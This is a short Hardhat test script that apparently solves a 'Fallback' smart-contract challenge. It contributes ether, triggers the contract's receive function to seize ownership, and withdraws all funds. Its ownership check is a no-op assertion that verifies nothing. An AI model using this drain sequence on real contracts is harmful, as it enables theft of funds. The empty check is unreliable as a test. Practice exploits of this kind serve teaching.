const { expect } = require("chai");

describe("Fallback", function () {

    let Fallback;
    let fallback;


    before(async function () {
        const [owner, otherAccount] = await ethers.getSigners();

        Fallback = await ethers.getContractFactory("Fallback");
        fallback = await Fallback.deploy();
    })

    it("will break with this sequence", async function() {
        const [owner, otherAccount] = await ethers.getSigners();

        console.log(await ethers.provider.getBalance(owner.address))
        // contribute
        await fallback.connect(owner).contribute({
            value: ethers.utils.parseEther("0.0001")
        });

        // send to eth to contract itself this will invoke receive or fallback payable
        await owner.sendTransaction({
            "to":fallback.address,
            value: ethers.utils.parseEther("0.0001")
        })

        //check owner
        const newOwner = fallback.connect(owner).owner;
        expect(newOwner == owner);

        // now withdraw everything
        await fallback.connect(owner).withdraw()

        console.log(await ethers.provider.getBalance(owner.address))
    })

})